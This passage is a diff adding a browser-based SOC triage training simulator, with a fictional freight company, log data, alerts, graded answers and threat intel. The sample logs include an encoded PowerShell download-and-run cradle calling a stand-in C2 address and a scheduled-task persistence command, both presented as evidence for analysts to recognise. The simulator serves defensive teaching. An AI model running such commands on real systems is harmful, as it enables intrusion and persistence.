@@ -1,0 +1,819 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style><meta name="theme-color" content="#0e141c">
+<meta name="description" content="Night Shift SOC — a Tier 1 SOC analyst triage simulator: work an alert queue, pivot in a Splunk-style SIEM, check threat intel, and write case reports.">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Night Shift SOC">
+<link rel="manifest" href="manifest.json">
+<link rel="apple-touch-icon" href="icons/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="icons/icon-192.png">
+</head><body>
+<title>Night Shift SOC</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: fixed console rail on the left, working pane on the right; rail becomes a top tab strip on phones. Single dark look on purpose (SOC consoles run dark). */
+:root{
+  --bg:#0e141c; --panel:#151d28; --panel2:#1b2533; --line:#273345; --fg:#dbe3ee; --muted:#8796ab;
+  --accent:#f0a64a; --accent-ink:#1a1206; --link:#7cb6ff;
+  --crit:#ff5d6c; --high:#ff8a4c; --med:#f2c94c; --low:#5fc7a3; --info:#7c8ea8;
+  --tp:#ff7a7a; --fp:#6fd3a9;
+  --f-display:"Chakra Petch", "Segoe UI", system-ui, sans-serif;
+  --f-body:"IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  --f-mono:"IBM Plex Mono", ui-monospace, Menlo, Consolas, monospace;
+  color-scheme:dark;
+}
+html,body{height:100%}
+body{background:var(--bg);color:var(--fg);font-family:var(--f-body);font-size:14px;line-height:1.5}
+*{box-sizing:border-box}
+button,input,select,textarea{font:inherit;color:inherit}
+a{color:var(--link)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.app{display:grid;grid-template-columns:220px 1fr;height:100%}
+.rail{background:var(--panel);border-right:1px solid var(--line);display:flex;flex-direction:column;padding-block:16px;padding-left:max(12px, env(safe-area-inset-left, 0px));padding-right:12px;gap:4px;overflow-y:auto}
+.brand{font-family:var(--f-display);font-weight:600;font-size:17px;letter-spacing:.04em;padding:4px 10px 14px;display:flex;align-items:center;gap:8px}
+.brand i{width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent)}
+.nav{all:unset;cursor:pointer;display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-radius:6px;color:var(--muted);font-weight:500}
+.nav:hover{background:var(--panel2);color:var(--fg)}
+.nav[aria-current="true"]{background:var(--panel2);color:var(--fg);box-shadow:inset 3px 0 0 var(--accent)}
+.nav .cnt{font-family:var(--f-mono);font-size:12px;background:var(--crit);color:#fff;border-radius:10px;padding:0 7px}
+.rail hr{border:0;border-top:1px solid var(--line);margin:8px 0;width:100%}
+.rail .spacer{flex:1}
+main{overflow-y:auto;padding-block:20px 40px;padding-right:max(20px, env(safe-area-inset-right, 0px));padding-left:20px;min-width:0}
+.topbar{display:flex;flex-wrap:wrap;gap:12px;align-items:center;justify-content:space-between;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px 16px;margin-bottom:16px}
+.topbar h1{font-family:var(--f-display);font-size:20px;margin:0;text-wrap:balance}
+.topbar p{margin:2px 0 0;color:var(--muted)}
+.clock{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.clock .time{font-family:var(--f-mono);font-size:18px;font-variant-numeric:tabular-nums;background:var(--bg);border:1px solid var(--line);padding:4px 10px;border-radius:6px}
+.btn{cursor:pointer;border:1px solid var(--line);background:var(--panel2);padding:6px 12px;border-radius:6px;font-weight:500}
+.btn:hover{border-color:var(--muted)}
+.btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-weight:600}
+.btn.sm{padding:3px 8px;font-size:12px}
+.btn[disabled]{opacity:.45;cursor:not-allowed}
+.seg{display:inline-flex;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.seg button{border:0;background:transparent;padding:5px 10px;cursor:pointer;font-family:var(--f-mono);font-size:12px;color:var(--muted)}
+.seg button[aria-pressed="true"]{background:var(--accent);color:var(--accent-ink)}
+.grid{display:grid;gap:16px}
+.tiles{grid-template-columns:repeat(auto-fit,minmax(140px,1fr))}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;min-width:0}
+.card h2,.card h3{font-family:var(--f-display);margin:0 0 10px;font-size:16px;font-weight:600;text-wrap:balance}
+.tile .lab{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.08em}
+.tile .val{font-family:var(--f-display);font-size:32px;font-variant-numeric:tabular-nums;line-height:1.1;margin-top:6px}
+.two{grid-template-columns:minmax(0,1fr) minmax(0,1.4fr)}
+@media (max-width:900px){.two{grid-template-columns:1fr}}
+.donut-wrap{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+.legend{display:grid;gap:6px;font-size:13px}
+.legend span{display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:8px}
+.tbl-wrap{overflow-x:auto}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th{text-align:left;color:var(--muted);font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid var(--line);padding:8px}
+td{border-bottom:1px solid var(--line);padding:8px;vertical-align:top}
+tr.click{cursor:pointer}
+tr.click:hover td{background:var(--panel2)}
+.mono{font-family:var(--f-mono);font-size:12.5px;font-variant-numeric:tabular-nums}
+.sev{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600}
+.sev::before{content:"";width:8px;height:8px;border-radius:50%;background:currentColor}
+.sev.Critical{color:var(--crit)}.sev.High{color:var(--high)}.sev.Medium{color:var(--med)}.sev.Low{color:var(--low)}
+.pill{display:inline-block;font-size:11.5px;padding:1px 8px;border-radius:10px;border:1px solid var(--line);color:var(--muted);white-space:nowrap}
+.pill.open{color:var(--accent);border-color:var(--accent)}
+.pill.owned{color:var(--link);border-color:var(--link)}
+.pill.tp{color:var(--tp);border-color:var(--tp)}
+.pill.fp{color:var(--fp);border-color:var(--fp)}
+.pill.good{color:var(--fp);border-color:var(--fp)}
+.pill.bad{color:var(--crit);border-color:var(--crit)}
+.muted{color:var(--muted)}
+.kv{display:grid;grid-template-columns:minmax(110px,max-content) 1fr;gap:6px 14px;font-size:13px}
+.kv dt{color:var(--muted)}
+.kv dd{margin:0;font-family:var(--f-mono);font-size:12.5px;word-break:break-all}
+.chip{cursor:pointer;border:1px dashed var(--line);background:transparent;border-radius:4px;padding:0 5px;font-family:var(--f-mono);font-size:12px;color:var(--link)}
+.chip:hover{border-color:var(--link)}
+.q{display:flex;gap:8px;flex-wrap:wrap}
+.q input{flex:1;min-width:200px;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;font-family:var(--f-mono);font-size:13px}
+.hint{font-size:12.5px;color:var(--muted)}
+pre.raw{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:10px;font-family:var(--f-mono);font-size:12px;white-space:pre-wrap;word-break:break-all;margin:6px 0 0}
+.verdict{border-radius:8px;padding:14px;border:1px solid var(--line);background:var(--panel2)}
+.verdict.bad{border-color:var(--crit)}
+.verdict.good{border-color:var(--fp)}
+.verdict.unk{border-color:var(--muted)}
+.prose{max-width:72ch}
+.prose h3{margin-top:18px}
+.prose li{margin-bottom:6px}
+.prose code{font-family:var(--f-mono);font-size:12.5px;background:var(--bg);padding:1px 5px;border-radius:4px}
+details.pb{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px 16px}
+details.pb summary{cursor:pointer;font-family:var(--f-display);font-weight:600;font-size:15px}
+details.pb ol{margin:10px 0 0;padding-left:20px}
+details.pb li{margin-bottom:6px}
+/* drawer */
+.scrim{position:fixed;inset:0;background:rgba(5,8,12,.6);z-index:20}
+.drawer{position:fixed;top:0;right:0;bottom:0;width:min(640px,100%);background:var(--panel);border-left:1px solid var(--line);z-index:21;overflow-y:auto;padding-block:calc(18px + env(safe-area-inset-top,0px)) calc(30px + env(safe-area-inset-bottom,0px));padding-left:20px;padding-right:max(20px, env(safe-area-inset-right, 0px));display:flex;flex-direction:column;gap:16px}
+.drawer h2{font-family:var(--f-display);margin:0;font-size:19px;text-wrap:balance}
+.form{display:grid;gap:12px}
+.form label.t{font-weight:600;font-size:13px}
+.radios{display:flex;gap:8px;flex-wrap:wrap}
+.radios label{display:flex;gap:6px;align-items:center;border:1px solid var(--line);border-radius:6px;padding:6px 12px;cursor:pointer}
+.radios input:checked + span{color:var(--accent);font-weight:600}
+textarea,.form input[type=text]{width:100%;background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;font-size:13px}
+textarea{min-height:110px;resize:vertical}
+.err{color:var(--crit);font-size:12.5px}
+.toast{position:fixed;left:50%;transform:translateX(-50%);bottom:calc(20px + env(safe-area-inset-bottom,0px));background:var(--accent);color:var(--accent-ink);padding:8px 16px;border-radius:6px;font-weight:600;z-index:30}
+.bar{height:8px;background:var(--bg);border-radius:4px;overflow:hidden}
+.bar i{display:block;height:100%;background:var(--accent)}
+.recipe{display:grid;gap:8px}
+.recipe .row{display:flex;gap:10px;align-items:flex-start;justify-content:space-between;flex-wrap:wrap}
+.recipe pre.raw{margin:0;flex:1;min-width:220px;color:var(--fg)}
+.recipe .room{font-family:var(--f-mono);font-size:12px;color:var(--muted);word-break:break-all}
+.recipe ul{margin:0;padding-left:18px}
+.recipe li{margin-bottom:4px}
+.anat{display:grid;grid-template-columns:minmax(0,max-content) 1fr;gap:8px 14px;align-items:start}
+.anat code{font-family:var(--f-mono);font-size:12.5px;background:var(--bg);padding:2px 6px;border-radius:4px;color:var(--accent);word-break:break-all}
+.qerr{border:1px solid var(--crit);border-radius:6px;padding:8px 10px;color:var(--crit);font-size:13px;margin:8px 0}
+td.num{text-align:right}
+@media (max-width:760px){
+  .app{grid-template-columns:1fr;grid-template-rows:auto 1fr}
+  .rail{flex-direction:row;overflow-x:auto;border-right:0;border-bottom:1px solid var(--line);padding-block:8px;padding-right:max(12px, env(safe-area-inset-right, 0px))}
+  .brand{padding:4px 8px;font-size:15px;white-space:nowrap}
+  .rail hr,.rail .spacer{display:none}
+  .nav{white-space:nowrap;gap:6px}
+  main{padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:max(16px, env(safe-area-inset-right, 0px))}
+}
+@media (prefers-reduced-motion:no-preference){.new-row td{animation:flash 1.6s ease-out}@keyframes flash{from{background:rgba(240,166,74,.25)}to{background:transparent}}}
+</style>
+
+<div class="app">
+  <nav class="rail" aria-label="Sections">
+    <div class="brand"><i></i>NIGHT SHIFT SOC</div>
+    <button class="nav" data-v="dashboard">Dashboard</button>
+    <button class="nav" data-v="queue">Alert queue <span class="cnt" id="qcnt" hidden>0</span></button>
+    <button class="nav" data-v="siem">SIEM</button>
+    <button class="nav" data-v="spl">SPL cookbook</button>
+    <button class="nav" data-v="intel">Threat intel</button>
+    <hr>
+    <button class="nav" data-v="docs">Documentation</button>
+    <button class="nav" data-v="playbooks">Playbooks</button>
+    <button class="nav" data-v="reports">Case reports</button>
+    <button class="nav" data-v="guide">Guide</button>
+    <div class="spacer"></div>
+    <button class="nav" id="resetBtn">Restart scenario</button>
+  </nav>
+  <main id="main"></main>
+</div>
+<div id="overlay"></div>
+<div id="toast" class="toast" hidden></div>
+
+<script>
+// ---------------- Scenario data (fictional company, documentation IP ranges) ----------------
+const BASE = new Date("2026-10-23T09:14:00");
+const fmt = t => { const d = new Date(BASE.getTime() + t*1000); return d.toTimeString().slice(0,8); };
+const H = {
+  zip:"4a70fe9aa6436e02c2dea340fbd1e352e4ef2d8ce6ca52ad25d4b95471fc8bf2",
+  lnk:"a5da9216129b1d877cbcb7cc536ed71bf3912d9c19cc64b4349177384174deff",
+  upd:"d77bbf05a3756773af2cbf58145fd61c8161f287686e41b9a1f16edf360245ce",
+  inv:"89270a50341bb8e83734ee062603c63c219320ed4a40fb9fb8c2792358548e8a",
+  svch:"8a31d24b04173b42d81155cdcf4975bbe8e112857ccfbba04be24d8cc1354d41",
+  ps:"6527c9361a2f469c5275afcb5d06e53013367cd231995de13dc7218711388382"
+};
+const ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADQANwAvAHUAJwApAA==";
+
+const LOGS = [
+ {t:-40, sourcetype:"email", action:"delivered", sender:"newsletter@okchamber-events.org", recipient:"all-staff@redbudfreight.com", subject:"October Member Mixer - RSVP by Friday", sender_ip:"198.51.100.20", spf:"pass", dkim:"pass", dmarc:"pass", attachment:"none", url:"https://okchamber-events.org/rsvp"},
+ {t:-25, sourcetype:"sysmon", EventID:1, host:"IT-ADM-02", user:"REDBUD\\d.kim", ParentImage:"C:\\Windows\\explorer.exe", Image:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine:"powershell.exe -ExecutionPolicy Bypass -File \\\\fs01\\it$\\scripts\\Get-AssetInventory.ps1", sha256:H.ps, signed:"true", script_sha256:H.inv},
+ {t:-20, sourcetype:"proxy", host:"WKS-HR-03", user:"REDBUD\\l.ortiz", process:"msedge.exe", dest_host:"outlook.office.com", dest_ip:"52.96.88.130", dest_port:443, bytes_out:4120},
+ {t:-5, sourcetype:"sysmon", EventID:3, host:"IT-ADM-02", user:"REDBUD\\d.kim", Image:"powershell.exe", SourceIp:"10.20.1.12", DestinationIp:"10.20.0.15", DestinationHostname:"fs01.redbudfreight.local", DestinationPort:445},
+ {t:10, sourcetype:"proxy", host:"WKS-FIN-07", user:"REDBUD\\j.harmon", process:"msedge.exe", dest_host:"outlook.office.com", dest_ip:"52.96.88.130", dest_port:443, bytes_out:3880},
+ {t:40, sourcetype:"email", action:"delivered", sender:"billing@redbud-freight-billing.com", recipient:"j.harmon@redbudfreight.com", subject:"OVERDUE: Invoice #44817 - final notice", sender_ip:"203.0.113.88", spf:"fail", dkim:"none", dmarc:"fail", reply_to:"collections.redbud@protonmail.example", attachment:"Invoice_44817.zip", attachment_sha256:H.zip},
+ {t:44, sourcetype:"email", action:"quarantined", sender:"billing@redbud-freight-billing.com", recipient:"l.ortiz@redbudfreight.com", subject:"OVERDUE: Invoice #44817 - final notice", sender_ip:"203.0.113.88", spf:"fail", dkim:"none", dmarc:"fail", reply_to:"collections.redbud@protonmail.example", attachment:"Invoice_44817.zip", attachment_sha256:H.zip, quarantine_reason:"DMARC fail + archive attachment (policy MAIL-07)"},
+ {t:70, sourcetype:"proxy", host:"WKS-HR-03", user:"REDBUD\\l.ortiz", process:"Teams.exe", dest_host:"teams.microsoft.com", dest_ip:"52.113.194.132", dest_port:443, bytes_out:9100},
+ {t:96, sourcetype:"sysmon", EventID:11, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"C:\\Windows\\explorer.exe", TargetFilename:"C:\\Users\\j.harmon\\Downloads\\Invoice_44817\\Invoice_44817.pdf.lnk", sha256:H.lnk},
+ {t:108, sourcetype:"sysmon", EventID:1, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", ParentImage:"C:\\Windows\\explorer.exe", Image:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine:"powershell.exe -w hidden -nop -enc "+ENC, sha256:H.ps, signed:"true"},
+ {t:112, sourcetype:"sysmon", EventID:3, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"powershell.exe", SourceIp:"10.20.4.37", DestinationIp:"203.0.113.47", DestinationPort:443},
+ {t:140, sourcetype:"sysmon", EventID:11, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"powershell.exe", TargetFilename:"C:\\Users\\j.harmon\\AppData\\Roaming\\svc\\updater.exe", sha256:H.upd},
+ {t:175, sourcetype:"email", action:"delivered", sender:"dse_na2@docusign.net", recipient:"s.patel@redbudfreight.com", subject:"Please DocuSign: 2027 Fuel Card Agreement - Keystone Fleet Services", sender_ip:"198.51.100.140", spf:"pass", dkim:"pass", dmarc:"pass", attachment:"none", url:"https://na2.docusign.net/Signing/EmailStart.aspx?a=7f3c"},
+ {t:200, sourcetype:"proxy", host:"WKS-OPS-11", user:"REDBUD\\s.patel", process:"msedge.exe", dest_host:"na2.docusign.net", dest_ip:"198.51.100.141", dest_port:443, bytes_out:6020},
+ {t:232, sourcetype:"sysmon", EventID:1, host:"WKS-FIN-07", user:"NT AUTHORITY\\SYSTEM", ParentImage:"C:\\Windows\\System32\\services.exe", Image:"C:\\Windows\\System32\\svchost.exe", CommandLine:"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", sha256:H.svch, signed:"true"},
+ {t:288, sourcetype:"sysmon", EventID:1, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", ParentImage:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", Image:"C:\\Windows\\System32\\schtasks.exe", CommandLine:"schtasks.exe /create /tn \"OneDriveSync\" /tr \"%APPDATA%\\svc\\updater.exe\" /sc onlogon /f", signed:"true"},
+ {t:289, sourcetype:"wineventlog", EventCode:4698, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", TaskName:"\\OneDriveSync", TaskAction:"C:\\Users\\j.harmon\\AppData\\Roaming\\svc\\updater.exe", Trigger:"AtLogon"},
+ {t:298, sourcetype:"sysmon", EventID:1, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", ParentImage:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", Image:"C:\\Users\\j.harmon\\AppData\\Roaming\\svc\\updater.exe", CommandLine:"updater.exe --silent", sha256:H.upd, signed:"false"},
+ {t:300, sourcetype:"sysmon", EventID:22, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"updater.exe", QueryName:"cdn-sync.redbud-freight-billing.com", QueryResults:"203.0.113.47"},
+ {t:302, sourcetype:"sysmon", EventID:3, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"updater.exe", SourceIp:"10.20.4.37", DestinationIp:"203.0.113.47", DestinationPort:443},
+ {t:362, sourcetype:"sysmon", EventID:3, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"updater.exe", SourceIp:"10.20.4.37", DestinationIp:"203.0.113.47", DestinationPort:443},
+ {t:422, sourcetype:"sysmon", EventID:3, host:"WKS-FIN-07", user:"REDBUD\\j.harmon", Image:"updater.exe", SourceIp:"10.20.4.37", DestinationIp:"203.0.113.47", DestinationPort:443},
+ {t:10, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.4.37", dest_ip:"52.96.88.130", dest_port:443, bytes_out:3880, bytes_in:21450, threat:"none"},
+ {t:112, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.4.37", dest_ip:"203.0.113.47", dest_port:443, bytes_out:1840, bytes_in:286720, threat:"intel-match"},
+ {t:200, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.6.40", dest_ip:"198.51.100.141", dest_port:443, bytes_out:6020, bytes_in:48210, threat:"none"},
+ {t:255, sourcetype:"firewall", host:"FW-EDGE-01", action:"blocked", protocol:"TCP", src_ip:"198.51.100.77", dest_ip:"10.20.0.1", dest_port:3389, bytes_out:0, bytes_in:60, threat:"none"},
+ {t:302, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.4.37", dest_ip:"203.0.113.47", dest_port:443, bytes_out:2310, bytes_in:1120, threat:"intel-match"},
+ {t:330, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.6.40", dest_ip:"198.51.100.200", dest_port:443, bytes_out:2210, bytes_in:30400, threat:"none"},
+ {t:362, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.4.37", dest_ip:"203.0.113.47", dest_port:443, bytes_out:1482560, bytes_in:1260, threat:"intel-match"},
+ {t:422, sourcetype:"firewall", host:"FW-EDGE-01", action:"allowed", protocol:"TCP", src_ip:"10.20.4.37", dest_ip:"203.0.113.47", dest_port:443, bytes_out:2284, bytes_in:1090, threat:"intel-match"},
+ {t:330, sourcetype:"proxy", host:"WKS-OPS-11", user:"REDBUD\\s.patel", process:"msedge.exe", dest_host:"www.fmcsa.dot.gov", dest_ip:"198.51.100.200", dest_port:443, bytes_out:2210},
+].sort((a,b)=>a.t-b.t);
+
+const ALERTS = [
+ {id:1000, at:0, sev:"Low", type:"Phishing", title:"Suspicious email from external domain",
+  fields:{sender:"newsletter@okchamber-events.org", recipient:"all-staff@redbudfreight.com", subject:"October Member Mixer - RSVP by Friday", sender_ip:"198.51.100.20", spf:"pass", dkim:"pass", dmarc:"pass", attachment:"none", url:"https://okchamber-events.org/rsvp", rule:"External sender to distribution list"},
+  hunt:['sender="newsletter@okchamber-events.org"'],
+  answer:{cls:"FP", esc:false}, keys:["okchamber-events.org"],
+  why:"The sender is the local chamber of commerce, which is on the approved sender list in Documentation. SPF, DKIM and DMARC all pass, there is no attachment, and the link goes to the sender's own domain. The rule fires on any external email to a distribution list, so this is expected noise."},
+ {id:1001, at:0, sev:"Low", type:"Process", title:"Suspicious Parent Child Relationship",
+  fields:{host:"IT-ADM-02", user:"REDBUD\\d.kim", parent:"explorer.exe", child:"powershell.exe", command_line:"powershell.exe -ExecutionPolicy Bypass -File \\\\fs01\\it$\\scripts\\Get-AssetInventory.ps1", script_sha256:H.inv, rule:"Shell launched PowerShell with ExecutionPolicy Bypass"},
+  hunt:['host="IT-ADM-02"'],
+  answer:{cls:"FP", esc:false}, keys:["Get-AssetInventory","CHG-2291"],
+  why:"This matches approved change CHG-2291 in Documentation: d.kim runs Get-AssetInventory.ps1 from IT-ADM-02 on weekday mornings. The script lives on the internal IT share, its hash is known-good in threat intel, and the only network traffic is SMB to fs01. ExecutionPolicy Bypass looks scary but is common in admin scripts."},
+ {id:1002, at:50, sev:"Medium", type:"Phishing", title:"Inbound email failed DMARC with archive attachment",
+  fields:{sender:"billing@redbud-freight-billing.com", recipient:"j.harmon@redbudfreight.com", subject:"OVERDUE: Invoice #44817 - final notice", sender_ip:"203.0.113.88", spf:"fail", dkim:"none", dmarc:"fail", reply_to:"collections.redbud@protonmail.example", attachment:"Invoice_44817.zip", attachment_sha256:H.zip, action:"delivered"},
+  hunt:['subject="*44817*"','attachment_sha256="'+H.zip+'"','sourcetype="email" subject="*44817*" | stats count by recipient, action'],
+  answer:{cls:"TP", esc:true}, keys:["redbud-freight-billing.com","Invoice_44817","203.0.113.88"],
+  why:"The sender domain is a look-alike of redbudfreight.com (extra hyphen, plus '-billing'), threat intel shows it was registered days ago, authentication fails, the Reply-To goes to an unrelated mailbox, and the email uses urgency ('final notice') with a zipped attachment whose hash is malicious. It was delivered to a finance user, so it needs escalation: the message must be pulled from mailboxes and the user's host checked."},
+ {id:1003, at:58, sev:"Low", type:"Phishing", title:"Inbound email failed DMARC with archive attachment",
+  fields:{sender:"billing@redbud-freight-billing.com", recipient:"l.ortiz@redbudfreight.com", subject:"OVERDUE: Invoice #44817 - final notice", sender_ip:"203.0.113.88", spf:"fail", dmarc:"fail", attachment:"Invoice_44817.zip", attachment_sha256:H.zip, action:"quarantined", quarantine_reason:"DMARC fail + archive attachment (policy MAIL-07)"},
+  hunt:['recipient="l.ortiz@redbudfreight.com"','host="WKS-HR-03"'],
+  answer:{cls:"TP", esc:false}, keys:["quarantined","l.ortiz"],
+  why:"Same malicious campaign as alert 1002, so it is a true positive. The gateway quarantined it and SIEM shows no file or process activity for Invoice_44817 on WKS-HR-03. The control worked and nothing reached the user, so you document it and link it to the 1002 case instead of escalating separately."},
+ {id:1004, at:118, sev:"High", type:"Execution", title:"PowerShell launched with encoded command",
+  fields:{host:"WKS-FIN-07", user:"REDBUD\\j.harmon", parent:"explorer.exe", child:"powershell.exe", command_line:"powershell.exe -w hidden -nop -enc "+ENC, rule:"Hidden window + encoded command"},
+  hunt:['host="WKS-FIN-07" EventID=1','host="WKS-FIN-07" EventID=11'],
+  answer:{cls:"TP", esc:true}, keys:["WKS-FIN-07","203.0.113.47","DownloadString"],
+  why:"Decoding the -enc blob gives IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.47/u'), a classic download-and-run cradle. Twelve seconds earlier explorer.exe wrote Invoice_44817.pdf.lnk to the Downloads folder: the user opened the zip from the phishing email and double-clicked a shortcut disguised as a PDF. Code is running on a finance workstation, so escalate immediately."},
+ {id:1005, at:124, sev:"Medium", type:"Network", title:"Outbound connection to IP with poor reputation",
+  fields:{host:"WKS-FIN-07", process:"powershell.exe", src_ip:"10.20.4.37", dest_ip:"203.0.113.47", dest_port:"443", rule:"Connection to threat-intel listed IP"},
+  hunt:['DestinationIp="203.0.113.47"','sourcetype="firewall" dest_ip="203.0.113.47" | table _time, src_ip, dest_ip, dest_port, action, bytes_out'],
+  answer:{cls:"TP", esc:true}, keys:["203.0.113.47","WKS-FIN-07"],
+  why:"PowerShell, not a browser, reached out to 203.0.113.47, which threat intel lists as command-and-control infrastructure. It is the same IP inside the encoded command from alert 1004. This is the payload download stage."},
+ {id:1006, at:190, sev:"Low", type:"Phishing", title:"External email containing link",
+  fields:{sender:"dse_na2@docusign.net", recipient:"s.patel@redbudfreight.com", subject:"Please DocuSign: 2027 Fuel Card Agreement - Keystone Fleet Services", sender_ip:"198.51.100.140", spf:"pass", dkim:"pass", dmarc:"pass", url:"https://na2.docusign.net/Signing/EmailStart.aspx?a=7f3c", rule:"External email with link to e-signature service"},
+  hunt:['recipient="s.patel@redbudfreight.com"'],
+  answer:{cls:"FP", esc:false}, keys:["docusign.net","Keystone"],
+  why:"DocuSign and Keystone Fleet Services are both on the vendor list, s.patel in Operations owns the fuel card program, authentication passes, and the link is a real docusign.net path. E-signature lures are common in phishing, which is why the rule exists, but every detail here checks out."},
+ {id:1007, at:240, sev:"Low", type:"Process", title:"Suspicious Parent Child Relationship",
+  fields:{host:"WKS-FIN-07", user:"NT AUTHORITY\\SYSTEM", parent:"services.exe", child:"svchost.exe", command_line:"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", sha256:H.svch, rule:"Process spawned on host with open incident"},
+  hunt:['host="WKS-FIN-07" Image="*svchost.exe"'],
+  answer:{cls:"FP", esc:false}, keys:["services.exe","svchost"],
+  why:"services.exe is the normal parent of svchost.exe, it runs as SYSTEM from System32, it is signed, and the -k netsvcs -s Schedule arguments are the Task Scheduler service. This alert fired only because the host already has an open incident. Being on a compromised host does not make every process malicious, so judge each one on its own evidence."},
+ {id:1008, at:296, sev:"High", type:"Persistence", title:"Scheduled task created by script interpreter",
+  fields:{host:"WKS-FIN-07", user:"REDBUD\\j.harmon", parent:"powershell.exe", child:"schtasks.exe", command_line:"schtasks.exe /create /tn \"OneDriveSync\" /tr \"%APPDATA%\\svc\\updater.exe\" /sc onlogon /f", rule:"schtasks /create from PowerShell"},
+  hunt:['TaskName="*OneDriveSync*"','Image="*updater.exe"'],
+  answer:{cls:"TP", esc:true}, keys:["OneDriveSync","updater.exe"],
+  why:"The malicious PowerShell created a task named to look like OneDrive that launches updater.exe from %APPDATA%\\svc at every logon. updater.exe was written by that same PowerShell process, is unsigned, and its hash is malicious. The attacker is setting up persistence, so the host needs isolation and reimaging, not just a reboot."},
+ {id:1009, at:430, sev:"Medium", type:"Network", title:"Periodic outbound connections (possible beaconing)",
+  fields:{host:"WKS-FIN-07", process:"updater.exe", dest_ip:"203.0.113.47", dest_hostname:"cdn-sync.redbud-freight-billing.com", dest_port:"443", interval:"~60s", rule:"Same destination at regular interval"},
+  hunt:['Image="updater.exe"','QueryName="*redbud-freight-billing*"','Image="updater.exe" EventID=3 | table _time, DestinationIp, DestinationPort','sourcetype="firewall" dest_ip="203.0.113.47" | stats sum(bytes_out) by src_ip'],
+  answer:{cls:"TP", esc:true}, keys:["updater.exe","203.0.113.47","cdn-sync"],
+  why:"updater.exe resolves a subdomain of the phishing domain and connects to the C2 IP every 60 seconds. A steady interval like this is beaconing: the implant checking in for commands. Combined with the earlier alerts, this confirms an active compromise of WKS-FIN-07. Pivoting to the firewall logs shows one check-in sent about 1.4 MB out, far more than a heartbeat needs, so data may have left the network: say so in the escalation."}
+];
+
+const INTEL = {
+ "203.0.113.47":{v:"malicious", score:"58/72", tags:["C2","Cobalt-style beacon","first seen 2026-10-19"], note:"Hosts payload at /u. Reported by multiple vendors as command-and-control."},
+ "203.0.113.88":{v:"malicious", score:"31/72", tags:["spam sender","bulletproof hosting"], note:"Sent phishing to multiple orgs this week."},
+ "redbud-freight-billing.com":{v:"malicious", score:"44/72", tags:["typosquat","registered 2026-10-20","phishing"], note:"Look-alike of redbudfreight.com. Registered 3 days ago through a privacy proxy."},
+ "cdn-sync.redbud-freight-billing.com":{v:"malicious", score:"40/72", tags:["C2"], note:"Resolves to 203.0.113.47."},
